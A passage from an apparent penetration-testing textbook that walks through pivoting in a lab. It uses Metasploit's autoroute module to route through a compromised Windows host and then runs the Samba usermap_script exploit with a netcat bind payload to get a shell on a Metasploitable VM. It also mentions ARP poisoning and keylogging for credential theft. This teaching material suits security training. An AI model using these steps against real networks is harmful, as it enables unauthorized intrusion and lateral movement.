                    <h1 class="header-title">Pivoting autoroutes</h1>
                </header>
            
            <article>
                
<p>Now that we understand the concept of pivoting, it won't be difficult to perform. All we need to do is upload any tool that we want to use; for example, if we want to use Nmap or ARP spoof or dSniff, we can upload those tools and run them on the Windows computer, which is connected to the big network, and then run a port scanner, perform ARP poisoning, or do man-in-the-middle attacks, just like we learned previously. It's very simple; all we have to do is use the <kbd>upload</kbd> command and use the tool from the command line.</p>
<p>In this section, we will see how to set up a route between the hacked computer and our computer, so that we can use any Metasploit auxiliary or module against the big network. We'll be able to use Metasploit exploits, port scanners, and other useful modules.</p>
<p>To do this, we're going to use a module called <kbd>autoroute</kbd>. Let's look at how to run an exploit on the Metasploitable virtual machine; it's should not work, because it's not visible to us for now. So, we will use <kbd>sessions list</kbd>, and will see that we have a connection through the Windows machine, which we already hacked:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1770 image-border" src="assets/695d1b86-c7c8-4401-abc9-2b172f1a3005.png" style="width:86.00em;height:12.33em;"/></p>
<p>Next, we will run <kbd>use exploit/multi/samba/usermap_script</kbd>—we already used this exploit against the Metasploitable device before, but it was on the same network then, so it was visible to us. This time, we're trying to attack a device that is invisible. Then, we will run <kbd>show options</kbd>, as follows:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1771 image-border" src="assets/4c365de3-abfe-4973-8c40-1bb602918e63.png" style="width:38.33em;height:18.25em;"/></p>
<p>We will set <kbd>RHOST</kbd> to <kbd>10.0.3.5</kbd>, because that's the IP address of the Metasploitable device. Then, when we use <kbd>set PAYLOAD cmd/unix/bind_netcat</kbd> and <kbd>show options</kbd>, everything will be set up properly; so, we will run <kbd>exploit</kbd>, and we will see that the exploit will time out, because (as we saw in the diagram in the <em>An introduction to pivoting</em> section) the hacker device cannot see the <span>Metasploitable</span> device. So, it's trying to run an exploit on the <span>Metasploitable</span><span> </span>device, even though the Metasploitable device has a vulnerability, but we won't be able to use it because we can't see the Metasploitable device, and, as we will see, the exploit failed, we received the <kbd>ConnectionTimeout</kbd>, and we just couldn't connect to the target computer, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1772 image-border" src="assets/ac7ed58b-249b-416b-bdc9-ddbf8965daf3.png" style="width:85.83em;height:7.83em;"/></p>
<p>Now, we will interact with Meterpreter on <kbd>ID 1</kbd> and run <kbd>sessions -i 1</kbd>. So, in our Meterpreter, we will run <kbd>ifconfig</kbd> to see those networks that the target computer is connected to:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1773 image-border" src="assets/b95d40ff-75a3-4e74-9c5d-794e9f2b8cbc.png" style="width:29.75em;height:36.00em;"/></p>
<p>We can see all of the interfaces connected to the target computer, and we will look for interfaces with IP addresses. We can see that interface number <kbd>9</kbd> has an IP address, and we can see that the IP address is on our network; so it's really not very useful. It's already on our network; we're on the <kbd>10.0.2.5/24</kbd> subnet. Another interface that we can see is <kbd>Interface 21</kbd>, which is connected to <kbd>10.0.3.4</kbd>; it's on a different subnet, which we cannot see from our Kali Linux device.</p>
<p>We will now try to set up a route between a different subnet and the current subnet. We will copy the address <kbd>10.0.3.4</kbd> and create a <kbd>background</kbd> of the current session, coming back to Metasploit. Then, we will run <kbd>use post/multi/manage/autoroute</kbd>. Now, if we want to see all of the managed modules at any point, <span><span>after the <kbd>use post/multi/manage/</kbd> command, </span></span>press <em>Tab</em> twice, and we will see all of the <kbd>post/multi/manage</kbd> modules and can try a new experiment with them:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1805 image-border" src="assets/7af4873e-2c2c-487d-9659-a9974daf2469.png" style="width:93.67em;height:9.17em;"/></p>
<p>The one that we want to use now is <kbd>autoroute</kbd>. We need to set the <kbd>SESSION</kbd> and the <kbd>SUBNET</kbd>; set the <kbd>SESSION</kbd> first, by running <kbd>set SESSION 1</kbd>, and then set the <kbd>SUBNET</kbd> to what we've seen when we ran the <kbd>ifconfig</kbd> command. It was <kbd>10.0.3.4</kbd>. Again, we're using the very simple commands that we have already learned.</p>
<p>We will set this <kbd>SESSION</kbd> to number <kbd>1</kbd> (that's the <kbd>SESSION</kbd> that we hacked for the Windows machine), and the <kbd>SUBNET</kbd> is the <kbd>SUBNET</kbd> that the Windows machine is connected to, so it's <kbd>10.0.3.0</kbd>. We will then run <kbd>exploit</kbd>, and this will create the connection (or the route) between our device and the Windows device:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1806 image-border" src="assets/5e551b8c-21b4-44c2-ba36-7b4f6502e5d6.png" style="width:87.67em;height:34.42em;"/></p>
<p>Now, we will go back to the same exploit that we tried at the start of this section, and we will see that the exploit is going to work now, because the Windows device is now visible to us. Instead of using the <kbd>exploit/multi/samba/usermap_script</kbd> exploit, we can use the port scanners or discovery modules that come pre-installed with Metasploit, or any other module that comes with Metasploit. We now have a connection to the Windows computer, and we have set up a route between that network and our computer, so we can now see the Metasploitable device.</p>
<p>Now, we are going to use the same exploit that we used before: <kbd>exploit/multi/samba/usermap_script</kbd>. We will leave the options the same, because everything is set up correctly. We will just run <kbd>exploit</kbd>, and, as we can see in the following screenshot, the command shell will start properly, and we will have access to the Metasploitable device:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1808 image-border" src="assets/9c61233e-34da-490c-a9ba-1d4c6560773b.png" style="width:33.67em;height:4.58em;"/></p>
<p>We can run <kbd>id</kbd> and <kbd>uname -a</kbd> to confirm the preceding, and we can see that we're in the Metasploitable device and can run any Linux command that we want; we can use <kbd>ls</kbd>, <kbd>pwd</kbd>, or any other Linux command, as follows:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1809 image-border" src="assets/30bcf721-bff9-4a6a-92c1-94e2451fe5a2.png" style="width:65.25em;height:42.50em;"/></p>
<p>Basically, we have full access to the target computer. As we mentioned previously, we can upload a program and run it from the target computer. However, it's not always a good idea to upload things to a hacked computer—setting up routes and using pivoting are much safer choices.</p>
<div class="packt_infobox">It is highly recommended to take a look at other <span>Metasploitable modules, because Metasploit is very vast. It was difficult for me to cover everything; I just covered the main points, but you can always go in and take a look at other modules. Using the modules in practice is usually the same as what we did here; we took a look at a broad array of modules, so you should be able to configure options and run modules however you like.</span></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary </h1>
                </header>
            
            <article>
                
<p>In this chapter, we focused on post exploitation tasks, which involved what can be done after we have broken into a target system. We covered basic filesystem commands and illustrated how to access a victim's machine, even if the user is not using a particular software or has powered off the system. We implemented both simple and advanced methods to maintain access to a system. Then, we looked at how to obtain user credentials after performing a keylogging attack on a target device. Later, we went over the concept of pivoting, which means targeting a system that is not directly present on our network. We even studied examples of pivoting autoroutes.</p>
<p>In the next few chapters, we will cover the fundamentals of website penetration testing.</p>


            </article>

            
        </section>
    </body></html>